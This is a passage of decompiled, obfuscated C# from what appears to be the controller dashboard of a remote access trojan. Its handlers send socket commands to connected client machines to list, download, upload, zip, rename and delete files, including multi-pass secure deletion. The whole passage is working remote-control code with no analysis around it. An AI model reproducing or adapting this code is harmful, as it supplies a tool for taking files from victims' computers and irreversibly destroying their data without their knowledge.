						ref double ptr3 = ref cclient.stats_bytes_out;
						unchecked
						{
							cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
							ptr3 = ref Class130.struct20_0.double_3;
							Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
							ptr3 = ref Class130.struct20_0.double_5;
							Class130.struct20_0.double_5 = ptr3 + 1.0;
						}
					}
					catch (Exception ex)
					{
					}
					concurrentDictionary[key] = value;
				}
			}
		}
	}

	// Token: 0x06000888 RID: 2184 RVA: 0x000409C8 File Offset: 0x0003EBC8
	private void method_44(object sender, EventArgs e)
	{
		fDashboard.Class125 @class = new fDashboard.Class125();
		@class.fDashboard_0 = this;
		@class.folderBrowserDialog_0 = new FolderBrowserDialog();
		checked
		{
			if (@class.folderBrowserDialog_0.ShowDialog() == DialogResult.OK)
			{
				fDashboard.Class124 class2 = new fDashboard.Class124();
				class2.class125_0 = @class;
				class2.string_0 = Strings.Replace(this.vmethod_398().Text, "Path: ", string.Empty, 1, -1, CompareMethod.Text);
				if (Operators.CompareString(Strings.Mid(class2.string_0, class2.string_0.Length, 1), "\\", true) != 0)
				{
					class2.string_0 += "\\";
				}
				if (MessageBox.Show("Upload " + class2.class125_0.folderBrowserDialog_0.SelectedPath + " to " + class2.string_0, Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
				{
					Class130.fTransferManager_0.Visible = true;
					Form fTransferManager_ = Class130.fTransferManager_0;
					bool flag = false;
					Form form = fTransferManager_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fTransferManager_0.Opacity = 100.0;
					Class130.fTransferManager_0.Activate();
					new Thread(new ThreadStart(class2._Lambda$__0)).Start();
				}
			}
		}
	}

	// Token: 0x06000889 RID: 2185 RVA: 0x00040B5C File Offset: 0x0003ED5C
	private void method_45(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_720();
		checked
		{
			if (gclass.SelectedItems.Count > 0)
			{
				Class130.fTransferManager_0.Visible = true;
				Form fTransferManager_ = Class130.fTransferManager_0;
				bool flag = false;
				Form form = fTransferManager_;
				Rectangle rectangle;
				if (this != null)
				{
					rectangle = this.RectangleToScreen(this.ClientRectangle);
				}
				else
				{
					rectangle = Screen.FromPoint(form.Location).WorkingArea;
				}
				int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
				int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
				form.Location = new Point(x, y);
				if (flag)
				{
					form.Visible = true;
				}
				Class130.fTransferManager_0.Opacity = 100.0;
				Class130.fTransferManager_0.Activate();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						ListViewItem listViewItem;
						string tag = Conversions.ToString((listViewItem = gclass.Items[i]).Tag);
						long num2 = 0L;
						this.method_48(ref tag, ref num2);
						listViewItem.Tag = tag;
					}
				}
			}
		}
	}

	// Token: 0x0600088A RID: 2186 RVA: 0x00040534 File Offset: 0x0003E734
	private void method_46(object sender, EventArgs e)
	{
		if (this.string_8.Length >= 3)
		{
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600088B RID: 2187 RVA: 0x00040C98 File Offset: 0x0003EE98
	private void method_47(object sender, EventArgs e)
	{
		checked
		{
			if (MessageBox.Show("Download selected directories?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				GClass7 gclass = this.vmethod_76();
				if (gclass.SelectedItems.Count > 0)
				{
					Class130.fTransferManager_0.Visible = true;
					Form fTransferManager_ = Class130.fTransferManager_0;
					bool flag = false;
					Form form = fTransferManager_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fTransferManager_0.Opacity = 100.0;
					Class130.fTransferManager_0.Activate();
				}
				int num = gclass.Items.Count - 1;
				int num3;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						ListViewItem listViewItem;
						string tag = Conversions.ToString((listViewItem = gclass.Items[i]).Tag);
						long num2 = 0L;
						this.method_48(ref tag, ref num2);
						listViewItem.Tag = tag;
						num3++;
					}
				}
				if (num3 > 0)
				{
					Class130.fTransferManager_0.Visible = true;
					Form fTransferManager_2 = Class130.fTransferManager_0;
					bool flag = false;
					Form form = fTransferManager_2;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fTransferManager_0.Opacity = 100.0;
					Class130.fTransferManager_0.Activate();
				}
			}
		}
	}

	// Token: 0x0600088C RID: 2188 RVA: 0x00040EA8 File Offset: 0x0003F0A8
	public void method_48(ref string string_12, ref long long_1)
	{
		ConcurrentDictionary<string, CClient> concurrentDictionary_;
		string key;
		CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_4];
		string text = string.Concat(new string[]
		{
			"files_download|",
			this.string_4,
			"|",
			string_12,
			"|",
			Conversions.ToString(long_1)
		});
		long num = 0L;
		ref string ptr = ref text;
		ref CClient ptr2 = ref value;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary_[key] = value;
	}

	// Token: 0x0600088D RID: 2189 RVA: 0x00040FE0 File Offset: 0x0003F1E0
	public void method_49(ref string string_12, ref string string_13)
	{
		ConcurrentDictionary<string, CClient> concurrentDictionary_;
		string key;
		CClient value = (concurrentDictionary_ = Class130.concurrentDictionary_3)[key = this.string_4];
		string[] array = new string[10];
		array[0] = "files_upload|";
		array[1] = this.string_4;
		array[2] = "|";
		array[3] = string_12;
		array[4] = "|";
		array[5] = string_13;
		array[6] = "|";
		int num = 7;
		string @string = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
		array[num] = Conversions.ToString(Class136.smethod_32(ref @string));
		array[8] = "|";
		int num2 = 9;
		@string = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
		array[num2] = Conversions.ToString(Class136.smethod_16(ref @string));
		string text = string.Concat(array);
		long num3 = 0L;
		ref string ptr = ref text;
		ref CClient ptr2 = ref value;
		try
		{
			if (num3 > 0L)
			{
				Thread.Sleep(checked((int)(num3 * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary_[key] = value;
	}

	// Token: 0x0600088E RID: 2190 RVA: 0x00041168 File Offset: 0x0003F368
	public void method_50(ref string string_12, ref string string_13)
	{
		StringBuilder stringBuilder = new StringBuilder();
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>();
		stack.Push(string_12);
		while (stack.Count > 0)
		{
			string path = stack.Pop();
			try
			{
				list.AddRange(Directory.GetFiles(path));
				foreach (string text in Directory.GetDirectories(path))
				{
					stack.Push(text);
					string s = string_13 + Path.GetFileName(string_12) + Strings.Replace(text, string_12, string.Empty, 1, -1, CompareMethod.Text);
					stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(s)) + "|");
				}
			}
			catch (Exception ex)
			{
			}
		}
		if (list.Count == 0)
		{
			Interaction.MsgBox("No file(s) to be uploaded!", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		string key;
		CClient value;
		long num;
		string ptr;
		CClient ptr2;
		if (stringBuilder.Length > 0)
		{
			ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
			value = concurrentDictionary_[key = this.string_4];
			string key2 = "files_upload_createdirs|" + stringBuilder.ToString();
			num = 0L;
			ptr = ref key2;
			ptr2 = ref value;
			ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
			try
			{
				if (num > 0L)
				{
					Thread.Sleep(checked((int)(num * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex2)
			{
			}
			concurrentDictionary[key] = value;
		}
		string str = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
		string text2 = Path.GetDirectoryName(string_13 + Path.GetFileName(string_12) + "\\") + " @ " + str + " [Upload]";
		int value2 = Directory.GetFiles(string_12, "*.*", SearchOption.AllDirectories).Length;
		Class130.concurrentDictionary_1.TryAdd(text2, value2);
		ConcurrentDictionary<string, CClient> concurrentDictionary2;
		checked
		{
			int num2 = list.Count - 1;
			string key2;
			for (int j = 0; j <= num2; j++)
			{
				Class130.long_3 += 1L;
				unchecked
				{
					while (Class130.long_3 >= (long)Class135.smethod_0().TransfersConcurrentMax)
					{
						Thread.Sleep(1);
					}
					string s2 = Path.GetDirectoryName(string_13 + Path.GetFileName(string_12) + Strings.Replace(list[j], string_12, string.Empty, 1, -1, CompareMethod.Text)) + "\\";
					ConcurrentDictionary<string, CClient> concurrentDictionary_2;
					value = (concurrentDictionary_2 = Class130.concurrentDictionary_3)[key2 = this.string_4];
					string[] array = new string[12];
					array[0] = "files_upload_dir|";
					array[1] = this.string_4;
					array[2] = "|";
					array[3] = Convert.ToBase64String(Encoding.UTF8.GetBytes(list[j]));
					array[4] = "|";
					array[5] = Convert.ToBase64String(Encoding.UTF8.GetBytes(s2));
					array[6] = "|";
					int num3 = 7;
					List<string> list2;
					int index;
					string value3 = (list2 = list)[index = j];
					long value4 = Class136.smethod_32(ref value3);
					list2[index] = value3;
					array[num3] = Conversions.ToString(value4);
					array[8] = "|";
					array[9] = Convert.ToBase64String(Encoding.UTF8.GetBytes(text2));
					array[10] = "|";
					int num4 = 11;
					value3 = (list2 = list)[index = j];
					long value5 = Class136.smethod_16(ref value3);
					list2[index] = value3;
					array[num4] = Conversions.ToString(value5);
					key = string.Concat(array);
					num = 0L;
					ptr = ref key;
					ptr2 = ref value;
					try
					{
						if (num > 0L)
						{
							Thread.Sleep(checked((int)(num * 60000L)));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient2 = ptr2;
						ref double ptr3 = ref cclient2.stats_bytes_out;
						cclient2.stats_bytes_out = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_3;
						Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_5;
						Class130.struct20_0.double_5 = ptr3 + 1.0;
					}
					catch (Exception ex3)
					{
					}
					concurrentDictionary_2[key2] = value;
				}
			}
			ConcurrentDictionary<string, CClient> concurrentDictionary_3 = Class130.concurrentDictionary_3;
			value = concurrentDictionary_3[key = this.string_4];
			key2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			num = 0L;
			ptr = ref key2;
			ptr2 = ref value;
			concurrentDictionary2 = concurrentDictionary_3;
		}
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient3 = ptr2;
			ref double ptr3 = ref cclient3.stats_bytes_out;
			cclient3.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex4)
		{
		}
		concurrentDictionary2[key] = value;
	}

	// Token: 0x0600088F RID: 2191 RVA: 0x0004174C File Offset: 0x0003F94C
	public void method_51(ref string string_12)
	{
		ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
		string key;
		CClient value = concurrentDictionary_[key = this.string_4];
		string text = "files_zip_dir|" + string_12;
		long num = 0L;
		ref string ptr = ref text;
		ref CClient ptr2 = ref value;
		ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary[key] = value;
		this.vmethod_156().Tag = Encoding.UTF8.GetString(Convert.FromBase64String(string_12)) + ".zip";
	}

	// Token: 0x06000890 RID: 2192 RVA: 0x00041878 File Offset: 0x0003FA78
	public void method_52(ref string string_12, ref long long_1)
	{
		ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
		string key;
		CClient value = concurrentDictionary_[key = this.string_4];
		string text = "files_delete_dir_secure|" + string_12 + "|" + Conversions.ToString(long_1);
		long num = 0L;
		ref string ptr = ref text;
		ref CClient ptr2 = ref value;
		ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary[key] = value;
		this.vmethod_156().Tag = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
	}

	// Token: 0x06000891 RID: 2193 RVA: 0x000419A8 File Offset: 0x0003FBA8
	public void method_53(ref string string_12)
	{
		ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
		string key;
		CClient value = concurrentDictionary_[key = this.string_4];
		string text = "files_delete_dir_normal|" + string_12;
		long num = 0L;
		ref string ptr = ref text;
		ref CClient ptr2 = ref value;
		ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary[key] = value;
		this.vmethod_156().Tag = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
	}

	// Token: 0x06000892 RID: 2194 RVA: 0x00041ACC File Offset: 0x0003FCCC
	public void method_54(ref string string_12, ref string string_13)
	{
		ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
		string key;
		CClient value = concurrentDictionary_[key = this.string_4];
		string text = "files_rename|" + string_12 + "|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(string_13));
		long num = 0L;
		ref string ptr = ref text;
		ref CClient ptr2 = ref value;
		ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
		try
		{
			if (num > 0L)
			{
				Thread.Sleep(checked((int)(num * 60000L)));
			}
			ptr += "@";
			byte[] bytes = Encoding.UTF8.GetBytes(ptr);
			ptr2.sock_async.method_6(bytes);
			CClient cclient = ptr2;
			ref double ptr3 = ref cclient.stats_bytes_out;
			cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_3;
			Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
			ptr3 = ref Class130.struct20_0.double_5;
			Class130.struct20_0.double_5 = ptr3 + 1.0;
		}
		catch (Exception ex)
		{
		}
		concurrentDictionary[key] = value;
	}

	// Token: 0x06000893 RID: 2195 RVA: 0x00002F44 File Offset: 0x00001144
	private void fDashboard_Activated(object sender, EventArgs e)
	{
	}

	// Token: 0x06000894 RID: 2196 RVA: 0x00041BE8 File Offset: 0x0003FDE8
	private void method_55(object sender, EventArgs e)
	{
		Class130.fTransferManager_0.Visible = true;
		Form fTransferManager_ = Class130.fTransferManager_0;
		bool flag = false;
		Form form = fTransferManager_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fTransferManager_0.Opacity = 100.0;
			Class130.fTransferManager_0.Activate();
		}
	}

	// Token: 0x06000895 RID: 2197 RVA: 0x00041BE8 File Offset: 0x0003FDE8
	private void method_56(object sender, EventArgs e)
	{
		Class130.fTransferManager_0.Visible = true;
		Form fTransferManager_ = Class130.fTransferManager_0;
		bool flag = false;
		Form form = fTransferManager_;
		Rectangle rectangle;
		if (this != null)
		{
			rectangle = this.RectangleToScreen(this.ClientRectangle);
		}
		else
		{
			rectangle = Screen.FromPoint(form.Location).WorkingArea;
		}
		checked
		{
			int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
			int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
			form.Location = new Point(x, y);
			if (flag)
			{
				form.Visible = true;
			}
			Class130.fTransferManager_0.Opacity = 100.0;
			Class130.fTransferManager_0.Activate();
		}
	}

	// Token: 0x06000896 RID: 2198 RVA: 0x00041C98 File Offset: 0x0003FE98
	private void method_57(object sender, EventArgs e)
	{
		if (MessageBox.Show("Add selected directory to ZIP?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
		{
			GClass7 gclass = this.vmethod_76();
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			ListViewItem listViewItem;
			string tag = Conversions.ToString((listViewItem = gclass.SelectedItems[0]).Tag);
			this.method_51(ref tag);
			listViewItem.Tag = tag;
		}
	}

	// Token: 0x06000897 RID: 2199 RVA: 0x00041D04 File Offset: 0x0003FF04
	private void method_58(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_720();
		if (gclass.SelectedItems.Count > 0 && MessageBox.Show("Add selected file(s) (" + Conversions.ToString(gclass.SelectedItems.Count) + ") to ZIP?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
		{
			this.vmethod_156().Tag = gclass.SelectedItems[0].Text + ".zip";
			string text = string.Empty;
			string key;
			CClient value;
			long num2;
			string ptr;
			CClient ptr2;
			ConcurrentDictionary<string, CClient> concurrentDictionary;
			checked
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(gclass.Items[i].Tag, "|")));
					}
				}
				ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
				value = concurrentDictionary_[key = this.string_4];
				string text2 = "files_zip|" + text;
				num2 = 0L;
				ptr = ref text2;
				ptr2 = ref value;
				concurrentDictionary = concurrentDictionary_;
			}
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
		}
	}

	// Token: 0x06000898 RID: 2200 RVA: 0x00041EF4 File Offset: 0x000400F4
	private void method_59(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_720();
		if (gclass.SelectedItems.Count > 0 && MessageBox.Show("Delete selected " + Conversions.ToString(gclass.SelectedItems.Count) + " file(s)? [Normal delete]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			string text = string.Empty;
			string key;
			CClient value;
			long num2;
			string ptr;
			CClient ptr2;
			ConcurrentDictionary<string, CClient> concurrentDictionary;
			checked
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(gclass.Items[i].Tag, "|")));
					}
				}
				ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
				value = concurrentDictionary_[key = this.string_4];
				string text2 = "files_delete_normal|" + text;
				num2 = 0L;
				ptr = ref text2;
				ptr2 = ref value;
				concurrentDictionary = concurrentDictionary_;
			}
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
		}
	}

	// Token: 0x06000899 RID: 2201 RVA: 0x000420CC File Offset: 0x000402CC
	private void method_60(object sender, EventArgs e)
	{
		GClass7 gclass = this.vmethod_720();
		if (gclass.SelectedItems.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(gclass.SelectedItems.Count) + " file(s)? [7 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			string text = "7|";
			string key;
			CClient value;
			long num2;
			string ptr;
			CClient ptr2;
			ConcurrentDictionary<string, CClient> concurrentDictionary;
			checked
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(gclass.Items[i].Tag, "|")));
					}
				}
				ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
				value = concurrentDictionary_[key = this.string_4];
				string text2 = "files_delete_secure|" + text;
				num2 = 0L;
				ptr = ref text2;
				ptr2 = ref value;
				concurrentDictionary = concurrentDictionary_;
			}
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
		}
	}

	// Token: 0x0600089A RID: 2202 RVA: 0x000422A4 File Offset: 0x000404A4
	private void method_61(object sender, EventArgs e)
	{
		string text = string.Empty;
		GClass7 gclass = this.vmethod_720();
		if (gclass.SelectedItems.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(gclass.SelectedItems.Count) + " file(s)? [3 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			text = "3|";
			string key;
			CClient value;
			long num2;
			string ptr;
			CClient ptr2;
			ConcurrentDictionary<string, CClient> concurrentDictionary;
			checked
			{
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						text = Conversions.ToString(Operators.AddObject(text, Operators.ConcatenateObject(gclass.Items[i].Tag, "|")));
					}
				}
				ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
				value = concurrentDictionary_[key = this.string_4];
				string text2 = "files_delete_secure|" + text;
				num2 = 0L;
				ptr = ref text2;
				ptr2 = ref value;
				concurrentDictionary = concurrentDictionary_;
			}
			try
			{
				if (num2 > 0L)
				{
					Thread.Sleep(checked((int)(num2 * 60000L)));
				}
				ptr += "@";
				byte[] bytes = Encoding.UTF8.GetBytes(ptr);
				ptr2.sock_async.method_6(bytes);
				CClient cclient = ptr2;
				ref double ptr3 = ref cclient.stats_bytes_out;
				cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_3;
				Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
				ptr3 = ref Class130.struct20_0.double_5;
				Class130.struct20_0.double_5 = ptr3 + 1.0;
			}
			catch (Exception ex)
			{
			}
			concurrentDictionary[key] = value;
			this.vmethod_170().Enabled = false;
			this.vmethod_174().Enabled = false;
			this.vmethod_146().Enabled = false;
		}
	}

	// Token: 0x0600089B RID: 2203 RVA: 0x00042480 File Offset: 0x00040680
	private void method_62(object sender, EventArgs e)
	{
		string text = string.Empty;
		GClass7 gclass = this.vmethod_720();
		if (gclass.SelectedItems.Count > 0 && MessageBox.Show("Secure delete selected " + Conversions.ToString(gclass.SelectedItems.Count) + " file(s)? [2 Passes]", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			text = "2|";
			string key;
			CClient value;
			long num2;
			string ptr;
			CClient ptr2;
